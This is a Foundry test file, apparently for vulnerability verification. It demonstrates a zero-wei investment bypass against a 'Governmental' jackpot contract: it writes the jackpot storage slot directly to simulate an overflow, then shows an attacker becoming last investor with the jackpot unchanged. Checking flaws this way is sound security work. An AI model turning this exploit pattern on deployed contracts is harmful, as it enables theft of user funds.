// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/governmental_survey.sol";

contract GovernmentalOverflowTest is Test {
    Governmental public governmental;
    address public attacker = makeAddr("attacker");
    
    function setUp() public {
        // Deploy Governmental contract with minimum 1 ether
        governmental = new Governmental{value: 1 ether}();
    }
    
    function test_investmentRequirementBypass() public {
        // Get jackpot storage slot (assumed slot 2)
        uint256 jackpotSlot = 2;
        
        // Simulate overflow consequence: set jackpot to 1 wei
        vm.store(
            address(governmental), 
            bytes32(jackpotSlot), 
            bytes32(uint256(1))
        );
        assertEq(governmental.jackpot(), 1, "Jackpot should be 1 wei");

        // ========================= BEFORE-TRIGGER =========================
        console.log("--- BEFORE-TRIGGER STATE ---");
        address lastInvestorBefore = governmental.lastInvestor();
        uint256 totalInvestmentsBefore = governmental.totalInvestments();
        uint256 jackpotBefore = governmental.jackpot();
        
        console.log("lastInvestor: %s", lastInvestorBefore);
        console.log("totalInvestments: %s", totalInvestmentsBefore);
        console.log("jackpot: %s", jackpotBefore);
        
        // ============================ TRIGGER =============================
        console.log("--- TRIGGER: Attacker invests 0 wei ---");
        vm.prank(attacker);
        governmental.invest{value: 0}();
        
        // ========================= AFTER-TRIGGER ==========================
        console.log("--- AFTER-TRIGGER STATE ---");
        address lastInvestorAfter = governmental.lastInvestor();
        uint256 totalInvestmentsAfter = governmental.totalInvestments();
        uint256 jackpotAfter = governmental.jackpot();
        
        console.log("lastInvestor: %s", lastInvestorAfter);
        console.log("totalInvestments: %s", totalInvestmentsAfter);
        console.log("jackpot: %s", jackpotAfter);
        
        // ========================= VERIFICATION ===========================
        bool investorChanged = (lastInvestorBefore != lastInvestorAfter);
        bool investmentsIncreased = (totalInvestmentsAfter == totalInvestmentsBefore + 1);
        bool jackpotEqual = (jackpotBefore == jackpotAfter);
        bool exploitSuccess = investorChanged && investmentsIncreased && jackpotEqual;
        
        // Print differential comparison
        console.log("--- DIFFERENTIAL COMPARISON ---");
        console.log("lastInvestor changed: %s", investorChanged ? "YES" : "NO");
        console.log("totalInvestions +1: %s", investmentsIncreased ? "YES" : "NO");
        console.log("jackpot unchanged: %s", jackpotEqual ? "YES" : "NO");
        
        // Final vulnerability verdict
        if (exploitSuccess) {
            console.log("Vulnerability Exists: Attacker succeeded in investing 0 wei, becoming last investor while keeping jackpot unchanged");
        } else {
            console.log("Vulnerability not Exist: State changes do not match vulnerability exploitation pattern");
        }
        
        // Fail test if vulnerability wasn't exploited
        assertTrue(exploitSuccess, "Vulnerability exploitation verification failed");
    }
}